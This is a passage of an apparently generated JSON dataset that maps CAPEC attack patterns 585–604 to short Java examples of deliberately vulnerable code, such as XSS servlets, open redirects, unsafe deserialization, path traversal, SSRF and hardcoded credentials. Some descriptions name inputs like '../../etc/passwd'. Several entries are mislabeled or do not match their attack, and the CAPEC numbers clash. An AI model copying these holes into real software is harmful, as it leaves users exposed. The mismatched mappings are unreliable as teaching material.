        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class DNSDomainSeizureExample {\n\n    public void handleRequest(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"redirectUrl\");\n        if (userInput != null && !userInput.isEmpty()) {\n            try {\n                InetAddress inetAddress = InetAddress.getByName(userInput);\n                String hostname = inetAddress.getHostName();\n                if (isTrustedDomain(hostname)) {\n                    response.sendRedirect(userInput);\n                } else {\n                    response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Untrusted domain\");\n                }\n            } catch (UnknownHostException e) {\n                response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid URL\");\n            }\n        } else {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"URL parameter is missing\");\n        }\n    }\n\n    private boolean isTrustedDomain(String hostname) {\n        // This is a placeholder for actual domain trust logic\n        return hostname.endsWith(\"trusted.com\");\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a web application handles user input for URL redirection. The code performs reverse DNS resolution to obtain the hostname from the user-provided URL and makes a security decision based on whether the hostname is trusted. This embodies the main idea of the CAPEC 'DNS Domain Seizure' by showing how an adversary could influence domain resolution to disrupt service. The code also highlights related CWEs: CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action), CWE-601 (URL Redirection to Untrusted Site), and CWE-942 (Permissive Cross-domain Policy with Untrusted Domains). The code is vulnerable because it relies on reverse DNS resolution for security decisions and could be exploited if the domain trust logic is not robust."
    },
    {
        "capec_id": "586",
        "capec_name": "Object Injection",
        "code_snippet": "import java.io.*;\n\nclass SensitiveData implements Serializable {\n    private static final long serialVersionUID = 1L;\n    private String secret;\n\n    public SensitiveData(String secret) {\n        this.secret = secret;\n    }\n\n    public String getSecret() {\n        return secret;\n    }\n}\n\npublic class VulnerableDeserialization {\n    public static void main(String[] args) {\n        try {\n            // Simulate receiving serialized data from an untrusted source\n            byte[] serializedData = getSerializedDataFromUntrustedSource();\n            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(serializedData));\n            SensitiveData data = (SensitiveData) ois.readObject();\n            System.out.println(\"Deserialized secret: \" + data.getSecret());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static byte[] getSerializedDataFromUntrustedSource() {\n        // This method simulates receiving a serialized object from an untrusted source\n        // In a real scenario, this could be data received over a network, etc.\n        try {\n            ByteArrayOutputStream baos = new ByteArrayOutputStream();\n            ObjectOutputStream oos = new ObjectOutputStream(baos);\n            oos.writeObject(new SensitiveData(\"malicious data\"));\n            return baos.toByteArray();\n        } catch (IOException e) {\n            e.printStackTrace();\n            return new byte[0];\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable deserialization scenario, where an application deserializes data from an untrusted source without proper validation. The `SensitiveData` class contains sensitive information and is serializable. The `VulnerableDeserialization` class simulates receiving serialized data from an untrusted source and deserializes it, potentially exposing sensitive data or allowing malicious code execution. This example embodies the main idea of CAPEC-74 (Object Injection) and highlights CWE-502 (Deserialization of Untrusted Data) and CWE-499 (Serializable Class Containing Sensitive Data)."
    },
    {
        "capec_id": "587",
        "capec_name": "Cross Frame Scripting (XFS)",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userContent = request.getParameter(\"content\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<iframe src='https://legitimate-site.com' style='display:none;' id='hiddenFrame'></iframe>\");\n        response.getWriter().println(\"<script>\");\n        response.getWriter().println(\"document.getElementById('hiddenFrame').onload = function() {\");\n        response.getWriter().println(\"  var iframeDoc = document.getElementById('hiddenFrame').contentDocument;\");\n        response.getWriter().println(\"  iframeDoc.body.innerHTML += '\" + userContent + \"';\");\n        response.getWriter().println(\"};\");\n        response.getWriter().println(\"</script>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a Cross Frame Scripting (XFS) vulnerability. The servlet takes user input from a request parameter 'content' and injects it into a hidden iframe that loads a legitimate site. The malicious JavaScript in the servlet interacts with the iframe's content, potentially manipulating the legitimate site's DOM without the user's knowledge. This example also highlights related weaknesses such as improper neutralization of input (CWE-79), improper restriction of frames (CWE-1021), and potential for Cross-Site Request Forgery (CWE-352)."
    },
    {
        "capec_id": "588",
        "capec_name": "DOM-Based XSS",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class DOMBasedXSSExample extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        response.setContentType(\"text/html\");\n        String userInput = request.getParameter(\"input\");\n        String htmlResponse = \"<html><body>\" +\n                \"<h1>Welcome!</h1>\" +\n                \"<div id='userInput'>\" + userInput + \"</div>\" +\n                \"<script>\" +\n                \"document.getElementById('userInput').innerHTML = '\" + userInput + \"';\" +\n                \"</script>\" +\n                \"</body></html>\";\n        response.getWriter().write(htmlResponse);\n    }\n}",
        "description": "This Java servlet code demonstrates a DOM-Based XSS vulnerability. The servlet reads a user-provided input from the HTTP request parameter 'input' and directly includes it in the HTML response without proper validation or encoding. The user input is inserted into a <div> element and also used within a <script> tag to manipulate the DOM. This allows an attacker to inject malicious scripts that will execute in the context of the user's browser, potentially leading to various attacks such as stealing cookies or session tokens. The code embodies the main idea of CAPEC-63 (DOM-Based XSS) and highlights related CWEs such as CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-83 (Improper Neutralization of Script in Attributes in a Web Page)."
    },
    {
        "capec_id": "589",
        "capec_name": "DNS Blocking",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class DNSBlockingExample {\n    public static void main(String[] args) {\n        try {\n            // Vulnerable code: Binding to an unrestricted IP address\n            ServerSocket serverSocket = new ServerSocket(53, 0, InetAddress.getByName(\"0.0.0.0\"));\n            System.out.println(\"DNS Server started on port 53\");\n\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                String request = in.readLine();\n\n                // Vulnerable code: Intercepting and dropping DNS requests based on content\n                if (request.contains(\"blocked-domain.com\")) {\n                    System.out.println(\"Blocking DNS request for: \" + request);\n                    clientSocket.close();\n                    continue;\n                }\n\n                // Process the DNS request (not implemented for brevity)\n                System.out.println(\"Processing DNS request for: \" + request);\n                clientSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple DNS server that listens on port 53, bound to the unrestricted IP address 0.0.0.0, which is a vulnerability (CWE-1327). The server reads incoming DNS requests and checks if the request contains a specific domain (e.g., 'blocked-domain.com'). If the domain is found, the server intentionally drops the request, simulating DNS blocking (CAPEC-300). This represents a denial of availability for specific services or content. The code also highlights the potential for an adversary to intercept and manipulate DNS traffic, which can lead to security issues such as reliance on IP address for authentication (CWE-291) and channel accessibility by non-endpoints (CWE-300)."
    },
    {
        "capec_id": "590",
        "capec_name": "IP Address Blocking",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class VulnerableServer {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(0)) { // CWE-1327: Binding to an Unrestricted IP Address\n            System.out.println(\"Server started on port: \" + serverSocket.getLocalPort());\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                String clientIP = clientSocket.getInetAddress().getHostAddress();\n                if (clientIP.equals(\"192.168.1.100\")) { // CWE-291: Reliance on IP Address for Authentication\n                    System.out.println(\"Accepted connection from: \" + clientIP);\n                    // Handle client connection\n                } else {\n                    System.out.println(\"Blocked connection from: \" + clientIP); // CAPEC: IP Address Blocking\n                    clientSocket.close();\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable server that binds to an unrestricted IP address (0.0.0.0), which is a common issue described in CWE-1327. The server accepts connections and relies on the client's IP address for authentication (CWE-291). If the client's IP address matches a specific value (192.168.1.100), the connection is accepted; otherwise, the connection is blocked, embodying the main idea of the CAPEC 'IP Address Blocking'. This approach is insecure because it relies solely on the IP address for authentication, which can be easily spoofed, and it does not adequately verify the identity of the actors at both ends of the communication channel (CWE-300, CWE-923)."
    },
    {
        "capec_id": "591",
        "capec_name": "Reflected XSS",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class ReflectedXSSExample extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>Welcome, \" + userInput + \"</h1>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a Reflected Cross-Site Scripting (XSS) vulnerability. The servlet takes a user-provided input from the HTTP request parameter 'input' and directly includes it in the HTML response without any sanitization or encoding. This allows an attacker to inject malicious scripts into the web page, which will be executed by the victim's browser when they visit the page. The code embodies CWE-79 (Improper Neutralization of Input During Web Page Generation) by failing to neutralize user input, making it susceptible to XSS attacks. The example also touches on CWE-81 (Improper Neutralization of Script in an Error Message Web Page) as it does not handle special characters that could be interpreted as web-scripting elements."
    },
    {
        "capec_id": "592",
        "capec_name": "Stored XSS",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.PrintWriter;\n\n@WebServlet(\"/storeComment\")\npublic class StoreCommentServlet extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String comment = request.getParameter(\"comment\");\n        // Simulate storing the comment in a database (in reality, this should be done with proper database handling)\n        request.getSession().setAttribute(\"storedComment\", comment);\n        response.sendRedirect(\"/displayComment\");\n    }\n}\n\n@WebServlet(\"/displayComment\")\npublic class DisplayCommentServlet extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        String storedComment = (String) request.getSession().getAttribute(\"storedComment\");\n        // Directly outputting the stored comment without any sanitization\n        out.println(\"<html><body>\");\n        out.println(\"<h1>Stored Comment</h1>\");\n        out.println(\"<p>\" + storedComment + \"</p>\");\n        out.println(\"</body></html>\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable web application that is susceptible to Stored Cross-Site Scripting (XSS) attacks. The `StoreCommentServlet` class accepts user input via a POST request and stores it in the session without any sanitization. The `DisplayCommentServlet` class retrieves the stored comment and directly outputs it to the web page without neutralizing the input. This lack of input validation and output encoding allows an attacker to store malicious scripts that will be executed when other users view the page, embodying the main idea of CAPEC-63 (Stored XSS). The code also reflects related CWEs, such as CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-692 (Incomplete Denylist to Cross-Site Scripting)."
    },
    {
        "capec_id": "593",
        "capec_name": "Session Hijacking",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\nimport java.io.IOException;\n\npublic class VulnerableSessionServlet extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String username = request.getParameter(\"username\");\n        String password = request.getParameter(\"password\");\n\n        // Simulate authentication (Improper Authentication - CWE-287)\n        if (\"admin\".equals(username) && \"password123\".equals(password)) {\n            HttpSession session = request.getSession();\n            session.setAttribute(\"user\", username);\n            // Session Fixation vulnerability (CWE-384)\n            // Not invalidating the old session ID\n            response.getWriter().println(\"Authenticated as \" + username);\n        } else {\n            response.getWriter().println(\"Invalid credentials\");\n        }\n    }\n\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        HttpSession session = request.getSession(false);\n        if (session != null && session.getAttribute(\"user\") != null) {\n            // Insufficient Session Expiration (CWE-613)\n            // Session does not expire properly\n            response.getWriter().println(\"Welcome back, \" + session.getAttribute(\"user\"));\n        } else {\n            response.getWriter().println(\"Please log in.\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates several vulnerabilities related to session hijacking. The `doPost` method simulates user authentication but does not properly validate the session ID, leading to a session fixation vulnerability (CWE-384). The session ID is not invalidated after authentication, allowing an attacker to reuse an old session ID. Additionally, the `doGet` method does not handle session expiration properly (CWE-613), allowing sessions to persist longer than they should. The code also demonstrates improper authentication (CWE-287) by using hardcoded credentials without proper validation mechanisms. These vulnerabilities collectively illustrate the concept of session hijacking, where an attacker can exploit weaknesses in session management to gain unauthorized access."
    },
    {
        "capec_id": "594",
        "capec_name": "Traffic Injection",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                handleClient(clientSocket);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void handleClient(Socket clientSocket) {\n        try (BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n             PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true)) {\n\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                // CWE-319: Cleartext Transmission of Sensitive Information\n                System.out.println(\"Received: \" + inputLine);\n                // Echo the received message back to the client\n                out.println(inputLine);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple server that listens for incoming connections on port 8080 and echoes back any received messages. The code embodies the main idea of CAPEC-148 (Traffic Injection) by not verifying the source of the communication channel (CWE-940), transmitting sensitive information in cleartext (CWE-319), and not ensuring message integrity (CWE-924). An adversary could inject traffic into this server's network connection, potentially modifying the content or disrupting the connection. The server does not perform any checks to verify the origin of the incoming requests, making it vulnerable to traffic injection attacks."
    },
    {
        "capec_id": "595",
        "capec_name": "Connection Reset",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\n\npublic class VulnerableServer {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                new Thread(new ClientHandler(clientSocket)).start();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n\nclass ClientHandler implements Runnable {\n    private Socket clientSocket;\n\n    public ClientHandler(Socket socket) {\n        this.clientSocket = socket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            // Simulate handling client request\n            Thread.sleep(1000);\n            // Simulate connection reset by an attacker\n            clientSocket.setSoLinger(true, 0);\n            clientSocket.close();\n        } catch (SocketException e) {\n            System.out.println(\"Connection reset by attacker\");\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable server that listens for incoming connections on port 8080. The server accepts client connections and handles them in separate threads. The ClientHandler class simulates handling a client request and then forcibly closes the connection using the setSoLinger method, which can be exploited by an attacker to reset the connection. This embodies the main idea of the CAPEC 'Connection Reset' attack pattern, where an adversary injects a connection reset packet to disrupt the communication. The code also touches on related CWEs such as improper verification of the source of a communication channel (CWE-940) and improper enforcement of message integrity (CWE-924) by not verifying the origin or integrity of the connection reset."
    },
    {
        "capec_id": "596",
        "capec_name": "TCP RST Injection",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.io.OutputStream;\n\npublic class TCPRSTInjectionExample {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server is listening on port 8080\");\n\n        while (true) {\n            Socket socket = serverSocket.accept();\n            System.out.println(\"New client connected\");\n\n            // Simulate improper verification of the source of a communication channel\n            if (isMaliciousRequest(socket)) {\n                sendTCPRST(socket);\n            }\n        }\n    }\n\n    private static boolean isMaliciousRequest(Socket socket) {\n        // Simplified check for demonstration purposes\n        // In a real scenario, this should involve more complex logic\n        return socket.getInetAddress().getHostAddress().equals(\"192.168.1.100\");\n    }\n\n    private static void sendTCPRST(Socket socket) throws IOException {\n        OutputStream out = socket.getOutputStream();\n        // Crafting a TCP RST packet (simplified)\n        byte[] rstPacket = new byte[] {0x00, 0x00, 0x00, 0x00}; // Placeholder for actual RST packet\n        out.write(rstPacket);\n        out.flush();\n        socket.close();\n        System.out.println(\"Sent TCP RST packet to terminate connection\");\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a TCP RST Injection attack. The server listens on port 8080 and accepts incoming connections. It checks if the incoming request is from a specific IP address (simulating improper verification of the source of a communication channel, CWE-940). If the request is identified as malicious, it sends a TCP RST packet to terminate the connection. This represents the main idea of the CAPEC, where an adversary injects TCP RST packets to disrupt a connection. The code is simplified and does not include actual TCP RST packet crafting, which would require lower-level network programming."
    },
    {
        "capec_id": "597",
        "capec_name": "Absolute Path Traversal",
        "code_snippet": "import java.io.*;\n\npublic class PathTraversalExample {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java PathTraversalExample <filename>\");\n            return;\n        }\n\n        String filename = args[0];\n        String basePath = \"/var/www/uploads/\";\n        File file = new File(basePath + filename);\n\n        try {\n            BufferedReader reader = new BufferedReader(new FileReader(file));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an Absolute Path Traversal vulnerability. The program takes a filename as a command-line argument and constructs a file path by concatenating a base directory path with the user-provided filename. This approach does not properly neutralize special path elements like '..', allowing an attacker to traverse directories and access files outside the intended directory. For example, providing '../../etc/passwd' as the filename could allow an attacker to read the system's password file. This code embodies the main idea of CAPEC-36 and related CWEs, highlighting the risk of using external input to construct file paths without proper validation."
    },
    {
        "capec_id": "598",
        "capec_name": "DNS Spoofing",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class DnsSpoofingExample {\n    public static void main(String[] args) {\n        try {\n            // CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n            String ipAddress = \"192.168.1.1\";\n            InetAddress inetAddress = InetAddress.getByName(ipAddress);\n            String hostname = inetAddress.getHostName();\n            System.out.println(\"Resolved Hostname: \" + hostname);\n\n            // CWE-941: Incorrectly Specified Destination in a Communication Channel\n            URL url = new URL(\"http://\" + hostname + \"/resource\");\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuilder content = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n            in.close();\n            connection.disconnect();\n            System.out.println(\"Response: \" + content.toString());\n\n            // CWE-494: Download of Code Without Integrity Check\n            URL codeUrl = new URL(\"http://\" + hostname + \"/malicious-code.jar\");\n            InputStream codeStream = codeUrl.openStream();\n            FileOutputStream fos = new FileOutputStream(\"malicious-code.jar\");\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = codeStream.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            codeStream.close();\n            System.out.println(\"Downloaded malicious code without integrity check.\");\n\n            // CWE-601: URL Redirection to Untrusted Site\n            String redirectUrl = \"http://untrusted-site.com\";\n            System.out.println(\"Redirecting to: \" + redirectUrl);\n\n            // CWE-918: Server-Side Request Forgery (SSRF)\n            URL ssrfUrl = new URL(\"http://localhost/admin\");\n            HttpURLConnection ssrfConnection = (HttpURLConnection) ssrfUrl.openConnection();\n            ssrfConnection.setRequestMethod(\"GET\");\n            BufferedReader ssrfIn = new BufferedReader(new InputStreamReader(ssrfConnection.getInputStream()));\n            String ssrfInputLine;\n            StringBuilder ssrfContent = new StringBuilder();\n            while ((ssrfInputLine = ssrfIn.readLine()) != null) {\n                ssrfContent.append(ssrfInputLine);\n            }\n            ssrfIn.close();\n            ssrfConnection.disconnect();\n            System.out.println(\"SSRF Response: \" + ssrfContent.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where DNS spoofing can be exploited, incorporating several related CWEs. The code performs the following actions:\n\n1. **CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action** - The code resolves an IP address to a hostname and uses this hostname for further actions, assuming the resolution is trustworthy.\n\n2. **CWE-941: Incorrectly Specified Destination in a Communication Channel** - The code constructs a URL using the resolved hostname and makes an HTTP request, potentially to an unintended destination.\n\n3. **CWE-494: Download of Code Without Integrity Check** - The code downloads a JAR file from the resolved hostname without verifying its integrity, which could lead to executing malicious code.\n\n4. **CWE-601: URL Redirection to Untrusted Site** - The code prints a message indicating a redirection to an untrusted site, which could be used in phishing attacks.\n\n5. **CWE-918: Server-Side Request Forgery (SSRF)** - The code makes a server-side request to a local admin endpoint, demonstrating how an attacker could exploit SSRF to access internal resources.\n\nOverall, the code illustrates how DNS spoofing can be used to manipulate network communications and exploit various security weaknesses."
    },
    {
        "capec_id": "599",
        "capec_name": "Terrestrial Jamming",
        "code_snippet": "import java.io.IOException;\nimport java.net.Socket;\nimport java.io.OutputStream;\nimport java.io.InputStream;\n\npublic class SatelliteCommunication {\n    private static final String SERVER_ADDRESS = \"192.168.1.100\";\n    private static final int SERVER_PORT = 8080;\n\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(SERVER_ADDRESS, SERVER_PORT);\n            OutputStream out = socket.getOutputStream();\n            InputStream in = socket.getInputStream();\n\n            // Sending sensitive data in cleartext\n            String sensitiveData = \"username=admin&password=admin123\";\n            out.write(sensitiveData.getBytes());\n            out.flush();\n\n            // Receiving response without ensuring message integrity\n            byte[] response = new byte[1024];\n            int bytesRead = in.read(response);\n            String responseData = new String(response, 0, bytesRead);\n            System.out.println(\"Response: \" + responseData);\n\n            // Closing the socket\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable satellite communication scenario. The code establishes a socket connection to a server, sends sensitive data in cleartext, and receives a response without ensuring message integrity. This embodies the main idea of the CAPEC 'Terrestrial Jamming' by showing how an adversary could disrupt or intercept the communication. The related CWEs are represented as follows:\n- CWE-319: Cleartext Transmission of Sensitive Information is shown by sending sensitive data without encryption.\n- CWE-924: Improper Enforcement of Message Integrity During Transmission is demonstrated by not verifying the integrity of the received message.\n- CWE-923: Improper Restriction of Communication Channel to Intended Endpoints is implied by the lack of endpoint verification in the socket connection."
    },
    {
        "capec_id": "600",
        "capec_name": "Credential Stuffing",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class CredentialStuffingExample {\n    private static Map<String, String> userDatabase = new HashMap<>();\n    private static Map<String, Integer> loginAttempts = new HashMap<>();\n    private static final int MAX_ATTEMPTS = 5;\n\n    public static void main(String[] args) {\n        // Adding some users to the database\n        userDatabase.put(\"user1\", \"password123\");\n        userDatabase.put(\"user2\", \"password123\");\n\n        // Simulating login attempts\n        System.out.println(login(\"user1\", \"password123\")); // Successful login\n        System.out.println(login(\"user1\", \"wrongpassword\")); // Failed login\n        System.out.println(login(\"user1\", \"wrongpassword\")); // Failed login\n        System.out.println(login(\"user1\", \"wrongpassword\")); // Failed login\n        System.out.println(login(\"user1\", \"wrongpassword\")); // Failed login\n        System.out.println(login(\"user1\", \"wrongpassword\")); // Account locked\n    }\n\n    public static String login(String username, String password) {\n        if (!userDatabase.containsKey(username)) {\n            return \"User not found\";\n        }\n\n        if (loginAttempts.getOrDefault(username, 0) >= MAX_ATTEMPTS) {\n            return \"Account locked due to too many failed attempts\";\n        }\n\n        if (userDatabase.get(username).equals(password)) {\n            loginAttempts.put(username, 0); // Reset attempts on successful login\n            return \"Login successful\";\n        } else {\n            loginAttempts.put(username, loginAttempts.getOrDefault(username, 0) + 1);\n            return \"Invalid credentials\";\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple login system that is vulnerable to credential stuffing attacks. The system stores user credentials in a HashMap and allows multiple login attempts without sufficient protection. The code includes a basic mechanism to lock an account after a certain number of failed attempts (CWE-307), but it lacks multi-factor authentication (CWE-308) and relies solely on passwords (CWE-309). The code also does not implement password aging (CWE-262, CWE-263) or secure storage of credentials (CWE-522). This example highlights the risks associated with using single-factor authentication and insufficient protection against excessive authentication attempts, making it susceptible to credential stuffing attacks."
    },
    {
        "capec_id": "601",
        "capec_name": "Jamming",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class JammingExample {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket(9876);\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n\n        while (true) {\n            socket.receive(packet);\n            String message = new String(packet.getData(), 0, packet.getLength());\n            System.out.println(\"Received: \" + message);\n\n            // Simulate improper enforcement of message integrity (CWE-924)\n            if (message.contains(\"legitimate\")) {\n                System.out.println(\"Legitimate message received.\");\n            } else {\n                System.out.println(\"Illegitimate message received.\");\n            }\n\n            // Simulate cleartext transmission of sensitive information (CWE-319)\n            String response = \"Sensitive data: 12345\";\n            DatagramPacket responsePacket = new DatagramPacket(response.getBytes(), response.length(), packet.getAddress(), packet.getPort());\n            socket.send(responsePacket);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple UDP server that listens for incoming messages on port 9876. It embodies the main idea of the CAPEC 'Jamming' by showing how an adversary could disrupt communications. The code includes vulnerabilities related to the described CWEs: \n1. CWE-924: The code does not verify the integrity of the received message, simply checking if it contains the word 'legitimate'.\n2. CWE-319: The code transmits sensitive information ('Sensitive data: 12345') in cleartext, which can be intercepted by unauthorized actors.\n\nThis example highlights how improper handling of message integrity and cleartext transmission can be exploited to disrupt legitimate communications and potentially leak sensitive information."
    },
    {
        "capec_id": "602",
        "capec_name": "DEPRECATED: Degradation",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            // Use of obsolete function (CWE-477)\n            Class.forName(\"com.mysql.jdbc.Driver\");\n            Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost/test\", \"user\", \"password\");\n            Statement stmt = conn.createStatement();\n            String query = \"SELECT * FROM users WHERE username='admin'\";\n            ResultSet rs = stmt.executeQuery(query);\n            while (rs.next()) {\n                System.out.println(\"User: \" + rs.getString(\"username\"));\n            }\n            rs.close();\n            stmt.close();\n            conn.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the use of an obsolete function (CWE-477) by using the deprecated 'com.mysql.jdbc.Driver' for database connectivity. The code connects to a MySQL database, executes a query to retrieve user information, and prints the username of the 'admin' user. The use of deprecated functions suggests that the code has not been actively reviewed or maintained, which can lead to potential security vulnerabilities. This embodies the main idea of the CAPEC related to degradation and the use of obsolete functions."
    },
    {
        "capec_id": "603",
        "capec_name": "Blockage",
        "code_snippet": "import java.util.ArrayList;\nimport java.util.List;\n\npublic class ResourceBlockage {\n    private static final int MAX_RESOURCES = 1000;\n    private List<Object> resources = new ArrayList<>();\n\n    public void allocateResource() {\n        // CWE-770: No limit on resource allocation\n        while (true) {\n            resources.add(new Object());\n            // CWE-400: Uncontrolled resource consumption\n            if (resources.size() > MAX_RESOURCES) {\n                System.out.println(\"Resource limit exceeded, system may fail.\");\n                break;\n            }\n        }\n    }\n\n    public static void main(String[] args) {\n        ResourceBlockage rb = new ResourceBlockage();\n        rb.allocateResource();\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary can block the delivery of an important system resource, causing the system to fail or stop working. The `allocateResource` method continuously allocates resources without proper limits (CWE-770), leading to uncontrolled resource consumption (CWE-400). When the number of allocated resources exceeds a predefined limit (MAX_RESOURCES), the system prints a warning message and breaks the loop, indicating a potential system failure due to resource exhaustion. This embodies the main idea of the CAPEC 'Blockage' by showing how improper resource management can lead to system failure."
    },
    {
        "capec_id": "604",
        "capec_name": "Wi-Fi Jamming",
